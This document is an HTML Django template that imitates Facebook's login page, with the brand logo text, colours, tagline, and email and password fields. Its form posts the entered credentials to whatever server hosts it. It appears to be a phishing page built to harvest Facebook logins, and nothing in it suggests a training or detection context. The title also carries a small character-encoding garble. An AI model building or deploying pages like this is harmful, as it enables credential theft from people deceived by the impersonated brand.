<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Facebook â€“ Log in</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background:#f0f2f5; font-family: Helvetica, Arial, sans-serif; }
        .fb-logo { color:#1877f2; font-size:48px; font-weight:700; }
        .login-card { border-radius:10px; box-shadow:0 2px 12px rgba(0,0,0,.2); }
        .form-control { height:48px; font-size:16px; }
        .btn-login { background:#1877f2; border:none; height:48px; font-size:18px; font-weight:600; }
        .btn-login:hover { background:#166fe5; }
        .forgot { color:#1877f2; font-size:14px; text-decoration:none; }
        .forgot:hover { text-decoration:underline; }
    </style>
</head>
<body>

<div class="container">
    <div class="row vh-100 align-items-center">

        <!-- Left text -->
        <div class="col-md-6 d-none d-md-block">
            <h1 class="fb-logo">facebook</h1>
            <h4 class="mt-2">
                Facebook helps you connect and share with the people in your life.
            </h4>
        </div>

        <!-- Login box -->
        <div class="col-md-6 d-flex justify-content-center">
            <div class="card login-card p-4" style="width:360px;">
                <form method="POST">
                    {% csrf_token %}
                    <input type="text" name="username" class="form-control mb-3" placeholder="Email or phone" required>
                    <input type="password" name="word" class="form-control mb-3" placeholder="Password" required>
                    <button type="submit" class="btn btn-login text-white w-100 mb-3">Log in</button>
                </form>
                <div class="text-center">
                    <a href="#" class="forgot">Forgotten password?</a>
                </div>
                <hr>
                <div class="text-center">
                    <button class="btn btn-success px-4">Create new account</button>
                </div>
            </div>
        </div>

    </div>
</div>

</body>
</html>
